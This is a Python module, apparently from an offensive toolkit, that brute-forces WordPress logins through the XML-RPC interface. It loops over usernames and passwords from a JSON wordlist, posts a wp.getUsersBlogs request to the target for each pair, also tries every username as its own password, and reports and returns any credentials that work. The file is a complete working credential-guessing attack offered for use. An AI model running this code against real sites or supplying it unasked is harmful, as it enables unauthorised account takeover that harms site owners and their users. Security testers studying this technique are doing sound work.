'''
name : WordPress XML-RPC Brute Force Attack Module
description : This module performs a brute force attack on the WordPress XML-RPC interface to gain access.
version : 1.0
author : Ayato
'''

import requests
import json

def try_login(url, username, password, user_agent):
    print(f"[*] Trying user {username} with password {password}")
    headers = {
        "User-Agent": f"{user_agent}",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    authed = {}
    try:
        xml = f"""<?xml version="1.0" ?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>{username}</string></value></param><param><value><string>{password}</string></value></param></params></methodCall>"""
        res = requests.post(
            url=url,
            timeout = (3, 3),
            headers = headers,
            data = xml
        )
        if "Incorrect username or password" in res.text:
            pass
        else:
            print(f"[+] Found wordpress password: {username}:{password}")
            authed[username] = password
    except Exception as e:
        print(f"error: {e}")
    return authed

def open_wordlist(wordlist_path):
    try:
        with open(wordlist_path, 'r') as f:
            wordlist = json.load(f)
        return wordlist
    except FileNotFoundError:
        print(f"[-] Wordlist file {wordlist_path} not found.")
        return None

def run(ip, uri, wordlist, user_agent):
    print("[*] Running WordPress XML-RPC brute force attack module...")
    print(f"[*] Target IP: {ip}")
    wordlist_data = open_wordlist(wordlist)
    if not wordlist_data:
        print("[-] No wordlist data found. Exiting.")
        return -1
    found_credentials = {}
    xml_rpc_url = f"http://{ip}{uri}"
    for username in wordlist_data['usernames']:
        for password in wordlist_data['passwords']:
            creds = try_login(f"{xml_rpc_url}", username, password, user_agent)
            if creds:
                found_credentials.update(creds)
            creds = try_login(f"{xml_rpc_url}", username, username, user_agent)
            if creds:
                found_credentials.update(creds)
    if found_credentials:
        print(f"[+] Found valid WordPress credentials: {str(found_credentials)[0:50]}{' <SNIP>' if len(str(found_credentials)) > 50 else ''}")
        return found_credentials
    if not found_credentials:
        print("[-] No valid WordPress credentials found.")
        return -1
